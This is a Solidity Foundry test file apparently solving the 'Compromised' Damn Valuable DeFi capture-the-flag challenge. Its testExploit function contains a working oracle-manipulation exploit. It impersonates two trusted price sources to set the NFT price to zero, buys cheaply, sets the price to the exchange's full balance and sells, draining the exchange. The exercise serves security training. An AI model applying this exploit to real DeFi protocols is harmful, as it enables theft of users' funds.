// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/compromised/Exchange.sol";
import "../../src/compromised/DamnValuableNFT.sol";
import "../../src/compromised/TrustfulOracle.sol";
import "../../src/compromised/TrustfulOracleInitializer.sol";

contract CompromisedTest is Test {
    using Address for address payable;

    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 10000 ether;
    uint256 internal constant INITIAL_NFT_PRICE = 999 ether;

    Exchange internal exchange;
    DamnValuableNFT internal token;
    TrustfulOracle internal oracle;

    address internal deployer = address(1);
    address internal attacker = address(2);
    address[] internal sources = [
        address(0xA73209FB1a42495120166736362A1DfA9F95A105),
        address(0xe92401A4d3af5E446d93D11EEc806b1462b39D15),
        address(0x81A5D6E50C214044bE44cA0CB057fe119097850c)
    ];

    function setUp() public {
        startHoax(deployer);

        // Fund the trusted source addresses
        payable(sources[0]).sendValue(5 ether);
        payable(sources[1]).sendValue(5 ether);
        payable(sources[2]).sendValue(5 ether);

        // Deploy the oracle and setup the trusted sources with initial prices
        string[] memory symbols = new string[](3);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";
        symbols[2] = "DVNFT";
        uint256[] memory initialPrices = new uint256[](3);
        initialPrices[0] = INITIAL_NFT_PRICE;
        initialPrices[1] = INITIAL_NFT_PRICE;
        initialPrices[2] = INITIAL_NFT_PRICE;
        TrustfulOracleInitializer initializer = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        );
        oracle = TrustfulOracle(initializer.oracle());

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(oracle)
        );
        token = DamnValuableNFT(exchange.token());

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        string memory symbol = "DVNFT";
        hoax(sources[0]);
        oracle.postPrice(symbol, 0);
        hoax(sources[1]);
        oracle.postPrice(symbol, 0);

        startHoax(attacker, 0.1 ether);
        uint256 tokenId = exchange.buyOne{value: 1}();
        token.approve(address(exchange), tokenId);
        vm.stopPrank();

        hoax(sources[0]);
        oracle.postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
        hoax(sources[1]);
        oracle.postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);

        hoax(attacker, 0.1 ether);
        exchange.sellOne(tokenId);

        hoax(sources[0]);
        oracle.postPrice(symbol, INITIAL_NFT_PRICE);
        hoax(sources[1]);
        oracle.postPrice(symbol, INITIAL_NFT_PRICE);

        /** SUCCESS CONDITION */
        assertEq(address(exchange).balance, 0);
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
    }
}
